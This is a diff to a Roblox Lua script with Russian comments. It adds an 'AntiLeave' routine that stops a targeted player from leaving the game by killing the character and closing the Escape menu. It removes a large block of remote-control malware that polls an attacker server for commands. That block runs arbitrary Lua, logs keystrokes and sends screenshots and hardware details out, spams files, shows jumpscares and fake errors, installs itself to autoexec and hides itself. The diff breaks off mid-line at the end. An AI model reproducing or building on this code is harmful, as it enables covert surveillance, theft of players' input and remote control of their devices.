@@ -39,6 +39,147 @@ local originalCoreGui = nil
 local lastAntiLeaveAction = 0
 local antiLeaveCooldown = 1
 
+-- ========== ANTI-LEAVE СИСТЕМА (ПРОСТАЯ) ==========
+local function setupSimpleAntiLeave()
+    warn("[AntiLeave] Инициализация системы...")
+    
+    local function createWarningGUI()
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "AntiLeaveWarning"
+        gui.Parent = player:WaitForChild("PlayerGui")
+        gui.ResetOnSpawn = false
+        
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0.5, 0, 0.2, 0)
+        frame.Position = UDim2.new(0.25, 0, 0.4, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+        frame.BorderColor3 = Color3.fromRGB(255, 50, 50)
+        frame.BorderSizePixel = 3
+        frame.Parent = gui
+        
+        local text = Instance.new("TextLabel")
+        text.Size = UDim2.new(0.9, 0, 0.8, 0)
+        text.Position = UDim2.new(0.05, 0, 0.1, 0)
+        text.Text = "🚫 ВЫХОД ЗАПРЕЩЕН!\nAntiLeave System активен"
+        text.TextColor3 = Color3.fromRGB(255, 50, 50)
+        text.TextScaled = true
+        text.Font = Enum.Font.GothamBold
+        text.BackgroundTransparency = 1
+        text.Parent = frame
+        
+        return gui
+    end
+
+    local function shouldBlockAction()
+        if not antiLeaveEnabled then 
+            return false 
+        end
+        
+        if antiLeaveTarget and antiLeaveTarget ~= player.Name then
+            return false
+        end
+        
+        local currentTime = tick()
+        if currentTime - lastAntiLeaveAction < antiLeaveCooldown then
+            return false
+        end
+        
+        lastAntiLeaveAction = currentTime
+        return true
+    end
+
+    local function showWarning()
+        task.spawn(function()
+            local gui = createWarningGUI()
+            
+            task.delay(3, function()
+                pcall(function()
+                    gui:Destroy()
+                end)
+            end)
+        end)
+    end
+
+    -- Обработчик выхода из игры
+    Players.PlayerRemoving:Connect(function(playerLeaving)
+        if playerLeaving == player then
+            warn("[AntiLeave] Игрок пытается выйти:", player.Name)
+            
+            if shouldBlockAction() then
+                warn("[AntiLeave] Блокируем выход!")
+                showWarning()
+                
+                -- Перезагружаем персонажа
+                task.delay(0.5, function()
+                    if player.Character then
+                        player.Character:BreakJoints()
+                    end
+                    player:LoadCharacter()
+                end)
+            end
+        end
+    end)
+
+    -- Блокировка меню Escape
+    UserInputService.InputBegan:Connect(function(input, processed)
+        if not processed and input.KeyCode == Enum.KeyCode.Escape then
+            if shouldBlockAction() then
+                warn("[AntiLeave] Блокируем меню Escape")
+                showWarning()
+                
+                -- Закрываем меню
+                task.spawn(function()
+                    local success = pcall(function()
+                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, nil)
+                        task.wait(0.1)
+                        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, nil)
+                    end)
+                end)
+            end
+        end
+    end)
+
+    return {
+        enable = function(target)
+            antiLeaveEnabled = true
+            antiLeaveTarget = target
+            
+            warn("[AntiLeave] Система включена для " .. (target or "всех игроков"))
+            
+            -- Сообщение в чат
+            if chatSystem then
+                chatSystem.addMessage("AntiLeave", 
+                    "🛡️ Система блокировки выхода активирована!" .. 
+                    (target and (" Цель: " .. target) or ""), 
+                    true
+                )
+            end
+        end,
+        
+        disable = function()
+            antiLeaveEnabled = false
+            antiLeaveTarget = nil
+            
+            warn("[AntiLeave] Система выключена")
+            
+            if chatSystem then
+                chatSystem.addMessage("AntiLeave", "🛡️ Система блокировки выхода деактивирована", true)
+            end
+        end,
+        
+        status = function()
+            return {
+                enabled = antiLeaveEnabled,
+                target = antiLeaveTarget
+            }
+        end
+    }
+end
+
+-- Инициализация AntiLeave системы
+local antiLeaveSystem = setupSimpleAntiLeave()
+
+-- ========== ОСТАЛЬНЫЕ ФУНКЦИИ ==========
 local function safeCheck(funcName)
     if funcName == "writefile" then
         return writefile ~= nil
@@ -674,766 +815,4 @@ local function jeffKillerJumpscare()
     jeffImage.BackgroundTransparency = 1
     jeffImage.ImageTransparency = 1
     jeffImage.ScaleType = Enum.ScaleType.Crop
-    jeffImage.ZIndex = 1000
-    jeffImage.Parent = screenGui
-    
-    local jeffAsset = loadImageFromURL(
-        "https://raw.githubusercontent.com/dispetcherr/files/main/image.png",
-        "15308155008"
-    )
-    jeffImage.Image = jeffAsset
-    
-    local warningSound = Instance.new("Sound")
-    warningSound.SoundId = "rbxassetid://18379039436"
-    warningSound.Volume = 0.9
-    warningSound.Parent = screenGui
-    warningSound:Play()
-    
-    task.wait(5)
-    
-    local jeffScream = Instance.new("Sound")
-    jeffScream.SoundId = "rbxassetid://112005418834382"
-    jeffScream.Volume = 2.2
-    jeffScream.Parent = screenGui
-    
-    jeffImage.ImageTransparency = 0
-    jeffScream:Play()
-    
-    for i = 1, 25 do
-        jeffImage.Rotation = math.random(-15, 15)
-        jeffImage.Position = UDim2.new(0, math.random(-60, 60), 0, math.random(-60, 60))
-        task.wait(0.02)
-    end
-    jeffImage.Rotation = 0
-    jeffImage.Position = UDim2.new(0, 0, 0, 0)
-    
-    local redOverlay = Instance.new("Frame")
-    redOverlay.Size = UDim2.new(1, 0, 1, 0)
-    redOverlay.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-    redOverlay.BackgroundTransparency = 0.9
-    redOverlay.ZIndex = 1001
-    redOverlay.Parent = screenGui
-    
-    for i = 1, 6 do
-        redOverlay.BackgroundTransparency = 0.7
-        task.wait(0.07)
-        redOverlay.BackgroundTransparency = 0.95
-        task.wait(0.07)
-    end
-    
-    pcall(function()
-        if redOverlay and redOverlay.Parent then
-            redOverlay:Destroy()
-        end
-    end)
-    
-    task.wait(1.2)
-    
-    local fadeOut = TweenService:Create(jeffImage, TweenInfo.new(1.5), {
-        ImageTransparency = 1
-    })
-    fadeOut:Play()
-    
-    task.wait(1.6)
-    
-    pcall(function()
-        if screenGui and screenGui.Parent then
-            screenGui:Destroy()
-        end
-    end)
-end
-
-local function sonicExeJumpscare()
-    local screenGui = createFullscreenGUI()
-    
-    local blackBg = Instance.new("Frame")
-    blackBg.Size = UDim2.new(1, 0, 1, 0)
-    blackBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    blackBg.BackgroundTransparency = 1
-    blackBg.ZIndex = 900
-    blackBg.Parent = screenGui
-    
-    local sonicImage = Instance.new("ImageLabel")
-    sonicImage.Size = UDim2.new(1, 0, 1, 0)
-    sonicImage.Position = UDim2.new(0, 0, 0, 0)
-    sonicImage.BackgroundTransparency = 1
-    sonicImage.ImageTransparency = 1
-    sonicImage.ScaleType = Enum.ScaleType.Crop
-    sonicImage.ZIndex = 1000
-    sonicImage.Parent = screenGui
-    
-    local sonicAsset = loadImageFromURL(
-        "https://raw.githubusercontent.com/dispetcherr/files/main/sonic_exe.png",
-        "13099898470"
-    )
-    sonicImage.Image = sonicAsset
-    
-    local errorSound = Instance.new("Sound")
-    errorSound.SoundId = "rbxassetid://184702873"
-    errorSound.Volume = 0.8
-    errorSound.Parent = screenGui
-    errorSound:Play()
-    
-    TweenService:Create(blackBg, TweenInfo.new(0.3), {
-        BackgroundTransparency = 0
-    }):Play()
-    
-    task.wait(1.5)
-    
-    for i = 1, 8 do
-        sonicImage.ImageTransparency = 0.3
-        sonicImage.Size = UDim2.new(1.1, 0, 1.1, 0)
-        sonicImage.Position = UDim2.new(-0.05, 0, -0.05, 0)
-        task.wait(0.05)
-        
-        sonicImage.ImageTransparency = 1
-        sonicImage.Size = UDim2.new(1, 0, 1, 0)
-        sonicImage.Position = UDim2.new(0, 0, 0, 0)
-        task.wait(0.05)
-    end
-    
-    sonicImage.ImageTransparency = 0
-    blackBg.BackgroundTransparency = 1
-    
-    local sonicScream = Instance.new("Sound")
-    sonicScream.SoundId = "rbxassetid://112005418834382"
-    sonicScream.Volume = 2.0
-    sonicScream.Parent = screenGui
-    sonicScream:Play()
-    
-    for i = 1, 30 do
-        sonicImage.ImageColor3 = Color3.fromRGB(
-            math.random(200, 255),
-            math.random(0, 100),
-            math.random(0, 100)
-        )
-        
-        sonicImage.Rotation = math.random(-20, 20)
-        sonicImage.Position = UDim2.new(
-            0, math.random(-80, 80),
-            0, math.random(-80, 80)
-        )
-        
-        local scale = 0.9 + math.random() * 0.3
-        sonicImage.Size = UDim2.new(scale, 0, scale, 0)
-        
-        task.wait(0.02)
-    end
-    
-    sonicImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
-    sonicImage.Rotation = 0
-    sonicImage.Position = UDim2.new(0, 0, 0, 0)
-    sonicImage.Size = UDim2.new(1, 0, 1, 0)
-    
-    local blueOverlay = Instance.new("Frame")
-    blueOverlay.Size = UDim2.new(1, 0, 1, 0)
-    blueOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 170)
-    blueOverlay.BackgroundTransparency = 0.9
-    blueOverlay.ZIndex = 1001
-    blueOverlay.Parent = screenGui
-    
-    local errorText = Instance.new("TextLabel")
-    errorText.Size = UDim2.new(1, 0, 1, 0)
-    errorText.Text = "FATAL ERROR\nSYSTEM CORRUPTED\nSONIC.EXE HAS TAKEN OVER"
-    errorText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    errorText.TextScaled = true
-    errorText.Font = Enum.Font.Code
-    errorText.BackgroundTransparency = 1
-    errorText.ZIndex = 1002
-    errorText.Parent = screenGui
-    
-    task.wait(1.5)
-    
-    blueOverlay.BackgroundTransparency = 1
-    errorText.TextTransparency = 1
-    
-    local sonicFade = TweenService:Create(sonicImage, TweenInfo.new(2), {
-        ImageTransparency = 1
-    })
-    sonicFade:Play()
-    
-    task.wait(2.1)
-    
-    pcall(function()
-        if screenGui and screenGui.Parent then
-            screenGui:Destroy()
-        end
-    end)
-end
-
-local function executeJumpscareCommand(scareType)
-    if scareType == 1 then
-        jeffKillerJumpscare()
-    elseif scareType == 2 then
-        sonicExeJumpscare()
-    else
-        jeffKillerJumpscare()
-    end
-end
-
--- AntiLeave System Functions
-local function createAntiLeaveUI()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "AntiLeaveOverlay"
-    screenGui.Parent = player:WaitForChild("PlayerGui")
-    screenGui.ResetOnSpawn = false
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.IgnoreGuiInset = true
-    screenGui.Enabled = false
-    
-    local overlay = Instance.new("Frame")
-    overlay.Name = "Overlay"
-    overlay.Size = UDim2.new(1, 0, 1, 0)
-    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    overlay.BackgroundTransparency = 0.7
-    overlay.BorderSizePixel = 0
-    overlay.ZIndex = 9999
-    overlay.Visible = false
-    overlay.Parent = screenGui
-    
-    local warningText = Instance.new("TextLabel")
-    warningText.Name = "WarningText"
-    warningText.Size = UDim2.new(0.8, 0, 0.2, 0)
-    warningText.Position = UDim2.new(0.1, 0, 0.4, 0)
-    warningText.BackgroundTransparency = 1
-    warningText.Text = "🚫 ВЫХОД ЗАПРЕЩЕН!\nAntiLeave System активирован"
-    warningText.TextColor3 = Color3.fromRGB(255, 50, 50)
-    warningText.TextScaled = true
-    warningText.Font = Enum.Font.GothamBold
-    warningText.ZIndex = 10000
-    warningText.Visible = false
-    warningText.Parent = screenGui
-    
-    return screenGui
-end
-
-local function shouldBlockAction()
-    if not antiLeaveEnabled then return false end
-    if antiLeaveTarget and antiLeaveTarget ~= player.Name then return false end
-    
-    local currentTime = tick()
-    if currentTime - lastAntiLeaveAction < antiLeaveCooldown then
-        return false
-    end
-    
-    lastAntiLeaveAction = currentTime
-    return true
-end
-
-local antiLeaveUI = nil
-
-local function showAntiLeaveWarning()
-    if not antiLeaveUI then
-        antiLeaveUI = createAntiLeaveUI()
-    end
-    
-    if antiLeaveUI and antiLeaveUI.Parent then
-        antiLeaveUI.Enabled = true
-        antiLeaveUI.Overlay.Visible = true
-        antiLeaveUI.WarningText.Visible = true
-        
-        task.delay(2, function()
-            if antiLeaveUI and antiLeaveUI.Parent then
-                antiLeaveUI.Overlay.Visible = false
-                antiLeaveUI.WarningText.Visible = false
-                antiLeaveUI.Enabled = false
-            end
-        end)
-    end
-end
-
-local function blockTeleport()
-    local teleportService = game:GetService("TeleportService")
-    
-    local oldTeleport = teleportService.Teleport
-    local oldTeleportAsync = teleportService.TeleportAsync
-    
-    local function checkAndBlock(...)
-        if shouldBlockAction() then
-            showAntiLeaveWarning()
-            
-            if chatSystem then
-                chatSystem.addMessage("AntiLeave", "Попытка телепортации заблокирована!", true)
-            end
-            
-            return
-        end
-        return oldTeleport(...)
-    end
-    
-    local function checkAndBlockAsync(...)
-        if shouldBlockAction() then
-            showAntiLeaveWarning()
-            
-            if chatSystem then
-                chatSystem.addMessage("AntiLeave", "Попытка телепортации заблокирована!", true)
-            end
-            
-            return
-        end
-        return oldTeleportAsync(...)
-    end
-    
-    teleportService.Teleport = checkAndBlock
-    teleportService.TeleportAsync = checkAndBlockAsync
-    
-    originalTeleportService = {
-        Teleport = oldTeleport,
-        TeleportAsync = oldTeleportAsync
-    }
-end
-
-local function blockGui()
-    local coreGui = game:GetService("CoreGui")
-    
-    local oldDestroy = coreGui.Destroy
-    
-    local function checkDestroy(self)
-        if shouldBlockAction() then
-            showAntiLeaveWarning()
-            
-            if chatSystem then
-                chatSystem.addMessage("AntiLeave", "Попытка закрытия GUI заблокирована!", true)
-            end
-            
-            return
-        end
-        return oldDestroy(self)
-    end
-    
-    coreGui.Destroy = function(...)
-        return checkDestroy(...)
-    end
-    
-    originalCoreGui = {
-        Destroy = oldDestroy
-    }
-end
-
-local function blockMenu()
-    local function onMenuOpened()
-        if shouldBlockAction() then
-            showAntiLeaveWarning()
-            
-            task.spawn(function()
-                pcall(function()
-                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, nil)
-                    task.wait(0.1)
-                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, nil)
-                end)
-            end)
-            
-            if chatSystem then
-                chatSystem.addMessage("AntiLeave", "Меню выхода было закрыто!", true)
-            end
-        end
-    end
-    
-    local success, menuButton = pcall(function()
-        return player:WaitForChild("PlayerGui"):WaitForChild("ScreenGui"):WaitForChild("MenuButton")
-    end)
-    
-    if success and menuButton then
-        menuButton.MouseButton1Click:Connect(onMenuOpened)
-    end
-    
-    UserInputService.InputBegan:Connect(function(input, processed)
-        if not processed and input.KeyCode == Enum.KeyCode.Escape then
-            onMenuOpened()
-        end
-    end)
-end
-
-local function blockLeaveAttempts()
-    local function onWindowFocusChanged(hasFocus)
-        if not hasFocus and shouldBlockAction() then
-            showAntiLeaveWarning()
-            
-            task.spawn(function()
-                pcall(function()
-                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F11, false, nil)
-                    task.wait(0.1)
-                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F11, false, nil)
-                end)
-            end)
-            
-            if chatSystem then
-                chatSystem.addMessage("AntiLeave", "Попытка переключения окна заблокирована!", true)
-            end
-        end
-    end
-    
-    if UserInputService.WindowFocused then
-        UserInputService.WindowFocused:Connect(onWindowFocusChanged)
-    end
-end
-
-local function restoreOriginalFunctions()
-    if originalTeleportService then
-        local teleportService = game:GetService("TeleportService")
-        teleportService.Teleport = originalTeleportService.Teleport
-        teleportService.TeleportAsync = originalTeleportService.TeleportAsync
-        originalTeleportService = nil
-    end
-    
-    if originalCoreGui then
-        local coreGui = game:GetService("CoreGui")
-        coreGui.Destroy = originalCoreGui.Destroy
-        originalCoreGui = nil
-    end
-end
-
-local function enableAntiLeave()
-    if antiLeaveEnabled then return end
-    
-    antiLeaveEnabled = true
-    
-    blockTeleport()
-    blockGui()
-    blockMenu()
-    blockLeaveAttempts()
-    
-    if chatSystem then
-        chatSystem.addMessage("AntiLeave", "Система AntiLeave активирована!", true)
-    end
-    
-    httpRequest({
-        Url = SERVER_URL.."/command",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({
-            command = "anti_leave_status",
-            args = {"enabled", player.Name}
-        })
-    })
-end
-
-local function disableAntiLeave()
-    if not antiLeaveEnabled then return end
-    
-    antiLeaveEnabled = false
-    restoreOriginalFunctions()
-    
-    if antiLeaveUI and antiLeaveUI.Parent then
-        antiLeaveUI.Enabled = false
-        antiLeaveUI.Overlay.Visible = false
-        antiLeaveUI.WarningText.Visible = false
-    end
-    
-    if chatSystem then
-        chatSystem.addMessage("AntiLeave", "Система AntiLeave деактивирована!", true)
-    end
-    
-    httpRequest({
-        Url = SERVER_URL.."/command",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({
-            command = "anti_leave_status",
-            args = {"disabled", player.Name}
-        })
-    })
-end
-
-local function setAntiLeaveTarget(targetPlayer)
-    antiLeaveTarget = targetPlayer
-    
-    if chatSystem then
-        chatSystem.addMessage("AntiLeave", 
-            targetPlayer and ("Цель установлена на: " .. targetPlayer) or "Цель сброшена (все игроки)", 
-            true
-        )
-    end
-end
-
--- Main command execution function
-local function ExecuteCommand(cmd, args)
-    local success = pcall(function()
-        if cmd == "chat" then
-            if chatSystem then
-                chatSystem.gui.Enabled = not chatSystem.gui.Enabled
-                chatSystem.enabled = chatSystem.gui.Enabled
-                if chatSystem.gui.Enabled then
-                    chatSystem.addMessage("Система", "Чат включен", true)
-                end
-            end
-        
-        elseif cmd == "popup" then
-            if args and args[1] then
-                showPopupMessage(args[1])
-            end
-        
-        elseif cmd == "print" then
-            -- проверка связи
-        
-        elseif cmd == "kick" then
-            player:Kick(args[1] or "Кикнут администратором")
-        
-        elseif cmd == "freeze" then
-            local character = player.Character or player.CharacterAdded:Wait()
-            local humanoid = character:FindFirstChildOfClass("Humanoid")
-            if humanoid then
-                humanoid.WalkSpeed = 0
-                task.delay(tonumber(args[1] or 5), function()
-                    if humanoid then humanoid.WalkSpeed = 16 end
-                end)
-            end
-        
-        elseif cmd == "void" then
-            local character = player.Character or player.CharacterAdded:Wait()
-            local root = character:FindFirstChild("HumanoidRootPart")
-            if root then
-                root.CFrame = CFrame.new(0, -5000, 0)
-            end
-        
-        elseif cmd == "spin" then
-            local character = player.Character or player.CharacterAdded:Wait()
-            local root = character:FindFirstChild("HumanoidRootPart")
-            if root then
-                for i = 1, 20 do
-                    if root then
-                        root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
-                        task.wait(0.1)
-                    end
-                end
-            end
-        
-        elseif cmd == "fling" then
-            local character = player.Character or player.CharacterAdded:Wait()
-            local root = character:FindFirstChild("HumanoidRootPart")
-            if root then
-                root.Velocity = Vector3.new(0, 5000, 0)
-            end
-        
-        elseif cmd == "sit" then
-            local character = player.Character or player.CharacterAdded:Wait()
-            local humanoid = character:FindFirstChildOfClass("Humanoid")
-            if humanoid then
-                humanoid.Sit = not humanoid.Sit
-            end
-        
-        elseif cmd == "dance" then
-            local character = player.Character or player.CharacterAdded:Wait()
-            local humanoid = character:FindFirstChildOfClass("Humanoid")
-            if humanoid then
-                local anim = Instance.new("Animation")
-                anim.AnimationId = "rbxassetid://35654637"
-                local track = humanoid:LoadAnimation(anim)
-                track:Play()
-            end
-        
-        elseif cmd == "blur" then
-            local blur = Instance.new("BlurEffect")
-            blur.Size = 24
-            blur.Parent = Lighting
-            task.delay(tonumber(args[1] or 5), function()
-                pcall(function() if blur then blur:Destroy() end end)
-            end)
-        
-        elseif cmd == "mute" then
-            for _, sound in ipairs(SoundService:GetDescendants()) do
-                if sound:IsA("Sound") then sound.Volume = 0 end
-            end
-        
-        elseif cmd == "unmute" then
-            for _, sound in ipairs(SoundService:GetDescendants()) do
-                if sound:IsA("Sound") then sound.Volume = 1 end
-            end
-        
-        elseif cmd == "playaudio" and args[1] then
-            local character = player.Character or player.CharacterAdded:Wait()
-            local root = character:FindFirstChild("HumanoidRootPart")
-            local sound = Instance.new("Sound")
-            sound.SoundId = "rbxassetid://"..args[1]
-            sound.Parent = root or player
-            sound:Play()
-            sound.Ended:Connect(function()
-                pcall(function() sound:Destroy() end)
-            end)
-        
-        elseif cmd == "execute" then
-            local result = executeLua(table.concat(args, " "))
-        
-        elseif cmd == "fakeerror" then
-            showFakeError(table.concat(args, " "))
-        
-        elseif cmd == "screenshot" then
-            local screenshotData = captureScreenshot()
-            if screenshotData then
-                httpRequest({
-                    Url = SERVER_URL.."/screenshot",
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        image = screenshotData
-                    })
-                })
-            end
-        
-        elseif cmd == "keylog" then
-            keyloggerEnabled = true
-            keylogBuffer = ""
-            lastSendTime = os.time()
-        
-        elseif cmd == "stopkeylog" then
-            keyloggerEnabled = false
-            if keylogBuffer ~= "" then
-                httpRequest({
-                    Url = SERVER_URL.."/keylog",
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        logs = keylogBuffer
-                    })
-                })
-            end
-            keylogBuffer = ""
-        
-        elseif cmd == "hardware" then
-            local hwInfo = getHardwareInfo()
-            httpRequest({
-                Url = SERVER_URL.."/hardware",
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    player = player.Name,
-                    data = hwInfo
-                })
-            })
-        
-        elseif cmd == "hide" then
-            hideScript()
-        
-        elseif cmd == "memory_spam" then
-            local fileCount = tonumber(args[1]) or 50
-            
-            task.spawn(function()
-                local savedCount = memorySpam(fileCount)
-                httpRequest({
-                    Url = SERVER_URL.."/command",
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        command = "spam_completed",
-                        args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount}
-                    })
-                })
-            end)
-        
-        elseif cmd == "gallery_spam" then
-            local imageCount = tonumber(args[1]) or 5
-            
-            task.spawn(function()
-                local savedCount = gallerySpam(imageCount)
-                httpRequest({
-                    Url = SERVER_URL.."/command",
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        command = "spam_completed",
-                        args = {"gallery_spam", "Сохранено "..savedCount.." файлов из "..imageCount}
-                    })
-                })
-            end)
-        
-        elseif cmd == "jumpscare" then
-            local scareType = tonumber(args[1]) or 1
-            task.spawn(function()
-                executeJumpscareCommand(scareType)
-            end)
-        
-        -- AntiLeave команды
-        elseif cmd == "anti_leave" then
-            local action = args[1]
-            local target = args[2]
-            
-            if action == "enable" then
-                enableAntiLeave()
-                if target and target ~= "" and target ~= "all" then
-                    setAntiLeaveTarget(target)
-                else
-                    setAntiLeaveTarget(nil)
-                end
-                
-            elseif action == "disable" then
-                disableAntiLeave()
-                setAntiLeaveTarget(nil)
-                
-            elseif action == "status" then
-                local status = antiLeaveEnabled and "Включен" or "Выключен"
-                local target = antiLeaveTarget or "Все"
-                
-                if chatSystem then
-                    chatSystem.addMessage("AntiLeave", 
-                        string.format("Статус: %s\nЦель: %s", status, target), 
-                        true
-                    )
-                end
-            end
-        
-        end
-    end)
-end
-
-local function checkCommands()
-    local success, response = pcall(function()
-        return httpRequest({
-            Url = SERVER_URL.."/data?player=" .. player.Name,
-            Method = "GET"
-        })
-    end)
-    
-    if success and response and response.Body then
-        local success, data = pcall(function()
-            return HttpService:JSONDecode(response.Body)
-        end)
-        
-        if success and data and data.command and data.command ~= "" then
-            ExecuteCommand(data.command, data.args or {})
-            return true
-        end
-    end
-    return false
-end
-
-local function initialize()
-    if deviceType == "PC" then
-        task.wait(1)
-        pcall(autoInstallToAutoexec)
-    end
-    
-    pcall(sendInjectNotification)
-    pcall(setupKeylogger)
-    pcall(hideScript)
-    pcall(function() antiLeaveUI = createAntiLeaveUI() end)
-end
-
-local function mainLoop()
-    while task.wait(2) do
-        pcall(checkCommands)
-        
-        if os.time() - lastUserUpdate >= 15 then
-            pcall(sendUserInfo)
-        end
-        
-        if keyloggerEnabled and os.time() - lastSendTime >= 300 then
-            if keylogBuffer ~= "" then
-                pcall(function()
-                    httpRequest({
-                        Url = SERVER_URL.."/keylog",
-                        Method = "POST",
-                        Headers = {["Content-Type"] = "application/json"},
-                        Body = HttpService:JSONEncode({
-                            logs = keylogBuffer
-                        })
-                    })
-                    keylogBuffer = ""
-                end)
-            end
-            lastSendTime = os.time()
-        end
-    end
-end
-
-pcall(initialize)
-pcall(mainLoop)
+    jeffImage.ZIndex
